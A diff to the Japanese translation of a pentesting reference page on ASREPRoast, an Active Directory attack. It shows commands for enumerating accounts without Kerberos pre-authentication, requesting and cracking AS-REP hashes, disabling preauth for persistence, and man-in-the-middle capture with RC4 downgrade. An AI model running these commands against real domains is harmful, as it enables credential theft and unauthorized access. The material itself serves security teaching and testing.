@@ -4,15 +4,15 @@
 
 ## ASREPRoast
 
-ASREPRoastは、**Kerberos事前認証必須属性**が欠如しているユーザーを悪用するセキュリティ攻撃です。本質的に、この脆弱性により、攻撃者はユーザーのパスワードを必要とせずにドメインコントローラー（DC）からユーザーの認証を要求できます。DCは、その後、ユーザーのパスワード由来のキーで暗号化されたメッセージで応答し、攻撃者はオフラインでそれを解読してユーザーのパスワードを発見しようとします。
+ASREPRoastは、**Kerberos pre-authentication required attribute**を持たないユーザーを悪用するセキュリティ攻撃です。具体的には、この脆弱性により攻撃者はユーザーのpasswordを知らなくてもDomain Controller (DC)に対してそのユーザーの認証を要求できます。DCはユーザーのpasswordから派生したキーで暗号化されたメッセージを返し、攻撃者はそれをofflineでクラックしてユーザーのpasswordを見つけようとします。
 
-この攻撃の主な要件は次のとおりです：
+主な前提条件は以下のとおりです:
 
-- **Kerberos事前認証の欠如**：ターゲットユーザーは、このセキュリティ機能が有効でない必要があります。
-- **ドメインコントローラー（DC）への接続**：攻撃者は、リクエストを送信し、暗号化されたメッセージを受信するためにDCへのアクセスが必要です。
-- **オプションのドメインアカウント**：ドメインアカウントを持つことで、攻撃者はLDAPクエリを通じて脆弱なユーザーをより効率的に特定できます。そのようなアカウントがない場合、攻撃者はユーザー名を推測しなければなりません。
+- **Lack of Kerberos pre-authentication**: ターゲットユーザーはこのセキュリティ機能を有効にしていない必要があります。
+- **Connection to the Domain Controller (DC)**: 攻撃者はリクエストを送信し暗号化されたメッセージを受信するためにDCへのアクセスが必要です。
+- **Optional domain account**: domain accountを持っていると、LDAPクエリで脆弱なユーザーをより効率的に特定できます。そうしたアカウントがない場合、攻撃者はユーザー名を推測する必要があります。
 
-#### 脆弱なユーザーの列挙（ドメイン資格情報が必要）
+#### 脆弱なユーザーの列挙 (need domain credentials)
 ```bash:Using Windows
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
@@ -20,7 +20,7 @@ Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```bash:Using Linux
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
 ```
-#### AS_REPメッセージを要求する
+#### AS_REP メッセージを要求する
 ```bash:Using Linux
 #Try all the usernames in usernames.txt
 python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
@@ -33,16 +33,22 @@ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashc
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
 ```
 > [!WARNING]
-> AS-REP Roasting with Rubeus は、暗号化タイプ 0x17 および事前認証タイプ 0 の 4768 を生成します。
+> AS-REP Roasting with Rubeus は暗号化タイプ0x17、preauthタイプ0の4768を生成します。
 
-### クラッキング
+#### Quick one-liners (Linux)
+
+- まず潜在的なターゲットを列挙します（例: leaked build paths から）Kerberos userenum で: `kerbrute userenum users.txt -d domain --dc dc.domain`
+- 単一ユーザーの AS-REP を空のパスワードでも取得するには `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` を使用します（netexec は LDAP signing/channel binding posture も表示します）。
+- `hashcat out.asreproast /path/rockyou.txt` でクラックします — AS-REP roast ハッシュに対して **-m 18200** (etype 23) を自動検出します。
+
+### クラック
 ```bash
 john --wordlist=passwords_kerb.txt hashes.asreproast
 hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
 ### Persistence
 
-**GenericAll** 権限（またはプロパティを書き込む権限）を持つユーザーに対して **preauth** を強制する必要はありません。
+あなたが **GenericAll** 権限（またはプロパティを書き込む権限）を持つユーザーに対して、Force **preauth** を不要にする:
 ```bash:Using Windows
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
@@ -50,10 +56,10 @@ Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbos
 ```bash:Using Linux
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
 ```
-## ASREProast without credentials
+## ASREProast 資格情報なし
 
-攻撃者は、ネットワークを横断する際にAS-REPパケットをキャプチャするために中間者の位置を利用でき、Kerberosの事前認証が無効になっていることに依存しません。したがって、VLAN上のすべてのユーザーに対して機能します。\
-[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)を使用することでこれを実現できます。さらに、このツールはKerberosの交渉を変更することにより、クライアントワークステーションにRC4を使用させることを強制します。
+攻撃者は man-in-the-middle の位置を利用して、Kerberos pre-authentication が無効化されていることに依存せずにネットワークを横断する AS-REP パケットを捕獲できます。したがって、VLAN 上のすべてのユーザーに対して機能します.\
+[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) を使うことでこれが可能です。さらに、このツールは Kerberos のネゴシエーションを改変してクライアントワークステーションに RC4 を使用させます。
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
 ASRepCatcher relay -dc $DC_IP
@@ -67,6 +73,7 @@ ASRepCatcher listen
 ## 参考文献
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
+- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
 
 ---
 
